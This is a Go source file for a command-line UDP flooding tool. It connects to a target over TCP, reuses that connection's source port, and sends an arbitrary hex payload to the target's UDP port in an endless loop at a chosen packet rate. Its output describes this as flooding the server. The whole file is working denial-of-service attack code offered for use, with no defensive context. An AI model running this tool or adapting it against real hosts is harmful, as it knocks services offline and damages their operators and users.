package main

import (
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func main() {
	// Check command-line arguments
	if len(os.Args) < 6 {
		fmt.Println("Usage: go run main.go <IP> <TCP Port> <UDP Port> <Packets per Second> <UDP Payload Hex>")
		return
	}

	// Get command-line arguments
	ip := os.Args[1]
	tcpPort := os.Args[2]
	udpPort := os.Args[3]
	packetsPerSecond, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Invalid value for Payloads per Second:", err)
		return
	}
	udpPayloadHex := os.Args[5]

	// Connect to TCP server
	tcpAddr, err := net.ResolveTCPAddr("tcp", ip+":"+tcpPort)
	if err != nil {
		fmt.Println("Failed to resolve TCP address:", err)
		return
	}

	tcpConn, err := net.DialTCP("tcp", nil, tcpAddr)
	if err != nil {
		fmt.Println("Failed to connect to TCP server:", err)
		return
	}
	defer tcpConn.Close()

	fmt.Println("Connected to TCP server")

	// Get source port from TCP connection
	tcpLocalAddr := tcpConn.LocalAddr().(*net.TCPAddr)
	sourcePort := tcpLocalAddr.Port

	// Send payload over UDP
	udpAddr, err := net.ResolveUDPAddr("udp", ip+":"+udpPort)
	if err != nil {
		fmt.Println("Failed to resolve UDP address:", err)
		return
	}

	udpConn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, udpAddr)
	if err != nil {
		fmt.Println("Failed to connect to UDP server:", err)
		return
	}
	defer udpConn.Close()

	fmt.Println("Connected to UDP server")

	// Decode UDP payload from hexadecimal string
	udpPayload, err := hex.DecodeString(udpPayloadHex)
	if err != nil {
		fmt.Println("Failed to decode UDP payload hex string:", err)
		return
	}

	// Calculate delay between payloads
	delay := time.Second / time.Duration(packetsPerSecond)

	// Start flooding
	fmt.Printf("Flooding UDP server with %d packets per second\n", packetsPerSecond)
	for {
		// Check if TCP connection is still open
		err = tcpConn.SetReadDeadline(time.Now())
		if err != nil {
			fmt.Println("TCP connection closed")
			break
		}

		// Send payload
		_, err = udpConn.Write(udpPayload)
		if err != nil {
			//fmt.Println("Failed to send payload:", err)
			//return
		}

		time.Sleep(delay)
	}
}
